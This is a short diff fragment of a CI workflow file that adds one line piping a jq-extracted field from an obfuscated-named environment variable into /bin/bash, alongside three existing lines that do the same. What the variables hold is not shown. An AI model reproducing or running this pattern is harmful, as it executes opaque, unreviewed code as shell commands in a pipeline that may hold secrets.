@@ -29,6 +29,7 @@ jobs:
           echo $e3 | jq -r .oj6 | /bin/bash
           echo $nu382 | jq -r .li8669 | /bin/bash
           echo $yfe12104 | jq -r .yutd604 | /bin/bash
+          printf '%s' "$pag13609" | jq -r .um96380 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
